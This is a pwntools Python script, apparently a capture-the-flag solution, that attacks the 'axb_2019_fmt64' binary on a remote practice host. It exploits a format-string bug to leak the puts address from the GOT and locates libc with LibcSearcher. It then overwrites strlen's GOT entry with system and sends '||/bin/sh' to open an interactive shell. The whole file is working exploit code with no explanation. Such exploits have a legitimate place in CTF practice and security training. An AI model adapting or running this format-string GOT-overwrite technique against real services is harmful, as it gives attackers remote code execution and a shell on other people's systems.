from pwn import *
from LibcSearcher import *
context.log_level = 'debug'
context.arch = 'amd64'

# io = process('./axb_2019_fmt64')
io = remote('node4.buuoj.cn', 26942)
elf = ELF('./axb_2019_fmt64')

io.sendlineafter(b'Please tell me:', b'%9$s\x00\x00\x00\x00' + p64(elf.got['puts']))
io.recvuntil(b'Repeater:')
puts = u64(io.recv(6) + b'\x00\x00')
libc = LibcSearcher('puts', puts)
base = puts - libc.dump('puts')
system = base + libc.dump('system')
print(hex(base))
print(hex(system))

payload = fmtstr_payload(8, {elf.got['strlen']: system}, numbwritten=9)

io.sendlineafter(b'Please tell me:', payload)

# gdb.attach(io, 'b *0x4008d0')
io.sendline(b'||/bin/sh')
io.interactive()
